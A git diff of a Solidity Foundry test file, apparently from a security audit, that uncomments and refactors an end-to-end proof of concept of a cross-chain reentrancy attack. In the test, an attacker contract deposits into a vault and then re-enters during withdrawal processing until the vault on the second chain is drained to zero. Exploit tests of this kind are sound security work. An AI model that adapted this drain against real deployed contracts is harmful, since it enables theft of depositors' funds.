@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-/*
+
 pragma solidity ^0.8.14;
 
 // Contracts
@@ -10,8 +10,6 @@ import "contracts/types/lzTypes.sol";
 // Test Utils
 import {MockERC20} from "./mocks/MockERC20.sol";
 import "./utils/BaseSetup.sol";
-
-
 struct BuildAttackArgs {
     address attackingContract;
     address fromSrc;
@@ -30,10 +28,16 @@ struct TestAttackVars {
     StateReq stateReq;
     LiqRequest liqReq;
     MockERC20 VICTIM_VAULT;
+    Actions action;
+    TestType testType;
+    address[] underlyings;
+    uint256[] victimVaults;
+    uint256[] amountsToDeposit;
+    bytes revertString;
     uint16 CHAIN_0;
     uint16 CHAIN_1;
     uint256 victimVault;
-    uint256 amountsToDeposit;
+    uint256 amount;
     uint256 CHAIN_0_PAYLOAD_ID;
     uint256 CHAIN_1_PAYLOAD_ID;
     uint256 sharesBalanceBeforeWithdraw;
@@ -45,8 +49,6 @@ struct TestAttackVars {
     address payable toDst;
 }
 
-
-
 contract AttackTest is BaseSetup {
     Attack internal attackCHAIN_0;
     Attack internal attackCHAIN_1;
@@ -54,22 +56,18 @@ contract AttackTest is BaseSetup {
     uint16 internal CHAIN_1;
     address lzEndpoint_0;
     address lzEndpoint_1;
+    string internal underlyingToken;
+    string internal vaultName;
 
     function setUp() public override {
-
-
-        UNDERLYING_TOKEN = "DAI";
+        super.setUp();
+        underlyingToken = "DAI";
+        vaultName = "DAIVault";
         CHAIN_0 = FTM;
         CHAIN_1 = POLY; // issue with FTM reverts
 
-
-
-        super.setUp();
-
         lzEndpoint_0 = LZ_ENDPOINTS[CHAIN_0];
         lzEndpoint_1 = LZ_ENDPOINTS[CHAIN_1];
-
-
 
         /// @dev deploy attacking contract on src and dst chain
         address payable chain0_SuperRouter = payable(
@@ -84,9 +82,9 @@ contract AttackTest is BaseSetup {
             getContract(CHAIN_1, "SuperDestination")
         );
 
-        address chain1_TOKEN = getContract(CHAIN_1, UNDERLYING_TOKEN);
+        address chain1_TOKEN = getContract(CHAIN_1, underlyingToken);
 
-        address chain1_TOKENVault = getContract(CHAIN_1, VAULT_NAME);
+        address chain1_TOKENVault = getContract(CHAIN_1, vaultName);
 
         vm.selectFork(FORKS[CHAIN_0]);
         vm.startPrank(deployer);
@@ -100,7 +98,7 @@ contract AttackTest is BaseSetup {
         );
 
         MockERC20 chain0_TOKEN = MockERC20(
-            super.getContract(CHAIN_0, UNDERLYING_TOKEN)
+            super.getContract(CHAIN_0, underlyingToken)
         );
 
         chain0_TOKEN.transfer(address(attackCHAIN_0), milionTokensE18 / 100);
@@ -118,42 +116,28 @@ contract AttackTest is BaseSetup {
         vm.stopPrank();
     }
 
-
-
     function test_attack_contract_same_address() public {
         assertEq(address(attackCHAIN_0), address(attackCHAIN_1));
     }
-
-
 
     /// @dev This is a test of an end to end possible attack. Testing individual parts (unit tests) can be taken from here
     function test_attack() public {
         TestAttackVars memory vars;
 
         vars.victimVault = 1; // should correspond to TOKEN vault
-        vars.amountsToDeposit = 1000;
+        vars.amount = 1000;
         vars.CHAIN_0_PAYLOAD_ID;
         vars.CHAIN_1_PAYLOAD_ID;
-        vars.underlyingSrcToken = getContract(CHAIN_0, UNDERLYING_TOKEN);
-        vars.underlyingDstToken = getContract(CHAIN_1, UNDERLYING_TOKEN);
+        vars.underlyingSrcToken = getContract(CHAIN_0, underlyingToken);
+        vars.underlyingDstToken = getContract(CHAIN_1, underlyingToken);
 
         vars.fromSrc = payable(getContract(CHAIN_0, "SuperRouter"));
         vars.toDst = payable(getContract(CHAIN_1, "SuperDestination"));
+        vars.action = Actions.Deposit;
+        vars.testType = TestType.Pass;
+        vars.revertString = "";
 
-        /// @dev Create liqRequest and stateReq for a couple users to deposit in target vault
-        (vars.stateReq, vars.liqReq) = _buildDepositCallData(
-            BuildCallDataArgs(
-                vars.fromSrc,
-                vars.toDst,
-                vars.underlyingSrcToken,
-                vars.victimVault,
-                vars.amountsToDeposit,
-                CHAIN_0,
-                CHAIN_1
-            )
-        );
-
-        vars.VICTIM_VAULT = MockERC20(getContract(CHAIN_1, UNDERLYING_TOKEN));
+        vars.VICTIM_VAULT = MockERC20(getContract(CHAIN_1, underlyingToken));
         vm.selectFork(FORKS[CHAIN_1]);
         assertEq(
             vars.VICTIM_VAULT.balanceOf(
@@ -162,27 +146,48 @@ contract AttackTest is BaseSetup {
             0
         );
 
-        StateReq[] memory stateReqs = new StateReq[](1);
-        LiqRequest[] memory liqReqs = new LiqRequest[](1);
+        vars.stateReqs = new StateReq[](1);
+        vars.liqReqs = new LiqRequest[](1);
+        vars.underlyings = new address[](1);
+        vars.victimVaults = new uint256[](1);
+        vars.amountsToDeposit = new uint256[](1);
 
-        stateReqs[0] = vars.stateReq;
-        liqReqs[0] = vars.liqReq;
+        vars.underlyings[0] = vars.underlyingSrcToken;
+        vars.victimVaults[0] = vars.victimVault;
+        vars.amountsToDeposit[0] = vars.amount;
 
-        /// @dev fund the vault with 10000 TOKEN
         for (uint256 i = 0; i < users.length; i++) {
-            _depositToVault(
+            /// @dev Create liqRequest and stateReq for a couple users to deposit in target vault
+            (vars.stateReq, vars.liqReq) = _buildDepositCallData(
+                BuildDepositCallDataArgs(
+                    users[i],
+                    vars.fromSrc,
+                    vars.toDst,
+                    vars.underlyings,
+                    vars.victimVaults,
+                    vars.amountsToDeposit,
+                    1000,
+                    CHAIN_0,
+                    CHAIN_1
+                )
+            );
+
+            vars.stateReqs[0] = vars.stateReq;
+            vars.liqReqs[0] = vars.liqReq;
+
+            _actionToSuperRouter(
                 InternalActionArgs(
-                    vars.underlyingSrcToken,
                     vars.fromSrc,
                     vars.toDst,
                     lzEndpoint_1,
                     users[i],
-                    stateReqs,
-                    liqReqs,
-                    vars.amountsToDeposit,
+                    vars.stateReqs,
+                    vars.liqReqs,
                     CHAIN_0,
                     CHAIN_1,
-                    ""
+                    vars.action,
+                    vars.testType,
+                    vars.revertString
                 )
             );
         }
@@ -190,7 +195,7 @@ contract AttackTest is BaseSetup {
         vm.selectFork(FORKS[CHAIN_1]);
         assertEq(
             vars.VICTIM_VAULT.balanceOf(vars.toDst),
-            vars.amountsToDeposit * users.length
+            vars.amount * users.length
         );
 
         /// @dev Update state on src and dst and process payload on dst
@@ -202,11 +207,19 @@ contract AttackTest is BaseSetup {
             _updateState(
                 vars.CHAIN_1_PAYLOAD_ID,
                 vars.amountsToDeposit,
-                CHAIN_1
+                0,
+                CHAIN_1,
+                vars.testType,
+                vars.revertString
             );
 
             vm.recordLogs();
-            _processPayload(vars.CHAIN_1_PAYLOAD_ID, CHAIN_1);
+            _processPayload(
+                vars.CHAIN_1_PAYLOAD_ID,
+                CHAIN_1,
+                vars.testType,
+                vars.revertString
+            );
 
             vars.logs = vm.getRecordedLogs();
             LayerZeroHelper(getContract(CHAIN_1, "LayerZeroHelper"))
@@ -221,25 +234,47 @@ contract AttackTest is BaseSetup {
                 vars.CHAIN_0_PAYLOAD_ID++;
             }
 
-            _processPayload(vars.CHAIN_0_PAYLOAD_ID, CHAIN_0);
+            _processPayload(
+                vars.CHAIN_0_PAYLOAD_ID,
+                CHAIN_0,
+                vars.testType,
+                vars.revertString
+            );
 
             vm.selectFork(FORKS[CHAIN_0]);
             assertEq(
                 SuperRouter(vars.fromSrc).balanceOf(users[i], 1),
-                vars.amountsToDeposit
+                vars.amount
             );
         }
 
-        vars.vaultMock = getContract(CHAIN_1, VAULT_NAME);
+        vars.vaultMock = getContract(CHAIN_1, vaultName);
         vm.selectFork(FORKS[CHAIN_1]);
         assertEq(
             VaultMock(vars.vaultMock).balanceOf(vars.toDst),
-            vars.amountsToDeposit * users.length
+            vars.amount * users.length
         );
 
         /// @dev Step 1 - deposit from the source attacker contract
         /// @dev Attack starts from the attacking contract which is the 'user'
         /// @dev Notice no parameters are changed here from the same kind of requests the other users did
+
+        (vars.stateReq, vars.liqReq) = _buildDepositCallData(
+            BuildDepositCallDataArgs(
+                address(attackCHAIN_0),
+                vars.fromSrc,
+                vars.toDst,
+                vars.underlyings,
+                vars.victimVaults,
+                vars.amountsToDeposit,
+                1000,
+                CHAIN_0,
+                CHAIN_1
+            )
+        );
+
+        vars.stateReqs[0] = vars.stateReq;
+        vars.liqReqs[0] = vars.liqReq;
 
         uint256 msgValue = 1 * _getPriceMultiplier(CHAIN_0) * 1e18;
 
@@ -249,6 +284,7 @@ contract AttackTest is BaseSetup {
             vars.liqReqs,
             vars.stateReqs
         );
+
         vars.logs = vm.getRecordedLogs();
         LayerZeroHelper(getContract(CHAIN_0, "LayerZeroHelper"))
             .helpWithEstimates(
@@ -259,9 +295,21 @@ contract AttackTest is BaseSetup {
             );
 
         vars.CHAIN_1_PAYLOAD_ID++;
-        _updateState(vars.CHAIN_1_PAYLOAD_ID, vars.amountsToDeposit, CHAIN_1);
+        _updateState(
+            vars.CHAIN_1_PAYLOAD_ID,
+            vars.amountsToDeposit,
+            0,
+            CHAIN_1,
+            vars.testType,
+            vars.revertString
+        );
 
-        _processPayload(vars.CHAIN_1_PAYLOAD_ID, CHAIN_1);
+        _processPayload(
+            vars.CHAIN_1_PAYLOAD_ID,
+            CHAIN_1,
+            vars.testType,
+            vars.revertString
+        );
 
         vars.logs = vm.getRecordedLogs();
         LayerZeroHelper(getContract(CHAIN_1, "LayerZeroHelper"))
@@ -273,12 +321,17 @@ contract AttackTest is BaseSetup {
             );
 
         vars.CHAIN_0_PAYLOAD_ID++;
-        _processPayload(vars.CHAIN_0_PAYLOAD_ID, CHAIN_0);
+        _processPayload(
+            vars.CHAIN_0_PAYLOAD_ID,
+            CHAIN_0,
+            vars.testType,
+            vars.revertString
+        );
         vars.sharesBalanceBeforeWithdraw = SuperRouter(vars.fromSrc).balanceOf(
             address(attackCHAIN_0),
             1
         );
-        assertEq(vars.sharesBalanceBeforeWithdraw, vars.amountsToDeposit);
+        assertEq(vars.sharesBalanceBeforeWithdraw, vars.amount);
 
         /// @dev Step 2 - Attacker previews how many assets he will be stealing from the vault in each reentrancy
         // Specifically he could choose to do  BscVaultBalanceAtBeginningOfAttack/sharesBalanceBeforeWithdraw (rounded down) reentrancies
@@ -297,7 +350,7 @@ contract AttackTest is BaseSetup {
                 vars.toDst,
                 vars.underlyingSrcToken,
                 vars.victimVault,
-                vars.amountsToDeposit,
+                vars.amount,
                 CHAIN_0,
                 CHAIN_1
             )
@@ -340,14 +393,17 @@ contract AttackTest is BaseSetup {
 
         /// @dev Step 4 - Reentrancy
         vars.CHAIN_1_PAYLOAD_ID++;
-        _processPayload(vars.CHAIN_1_PAYLOAD_ID, CHAIN_1);
+        _processPayload(
+            vars.CHAIN_1_PAYLOAD_ID,
+            CHAIN_1,
+            vars.testType,
+            vars.revertString
+        );
 
         vm.selectFork(FORKS[CHAIN_1]);
         /// @dev WARNING - Asserts vault in chain1 has been drained
         assertEq(VaultMock(vars.vaultMock).balanceOf(vars.toDst), 0);
     }
-
-
 
     function _buildWithdrawAttackCallData(BuildAttackArgs memory args)
         internal
@@ -397,4 +453,3 @@ contract AttackTest is BaseSetup {
         );
     }
 }
-*/
